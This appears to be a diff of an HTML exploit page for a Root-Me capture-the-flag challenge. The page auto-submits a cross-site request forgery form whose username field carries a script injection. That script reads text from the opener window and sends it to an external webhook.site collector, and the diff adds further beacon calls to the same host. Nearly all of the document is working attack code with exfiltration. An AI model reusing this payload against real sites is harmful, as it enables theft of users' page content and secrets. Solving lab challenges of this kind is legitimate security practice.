@@ -8,15 +8,18 @@
 
 <h1>CSRF</h1>
 <form method="POST" action="http://challenge01.root-me.org:58003/login">
-  <input type="text" name="username" value="<script>new Image().src='https://webhook.site/0a33c9c6-2caf-4140-9d00-a651080fe455?g6g='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);</script>">
+  <input type="text" name="username" value="<script>document.location='https://webhook.site/0a33c9c6-2caf-4140-9d00-a651080fe455?g6g='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);</script>">
   <input type="text" name="secret" value="FAILED">
   <input type="submit">
 </form>
 
 <script>
-
+    new Image().src='https://webhook.site/0a33c9c6-2caf-4140-9d00-a651080fe455?g6g='+'step2';
     window.opener.postMessage({redirect: "go"}, "*");
-    setTimeout(() => document.querySelector("form").submit(), 3000 );
+    setTimeout(() => {
+        new Image().src='https://webhook.site/0a33c9c6-2caf-4140-9d00-a651080fe455?g6g='+'step4';
+        document.querySelector("form").submit();
+        }, 3000 );
 
 </script>
 
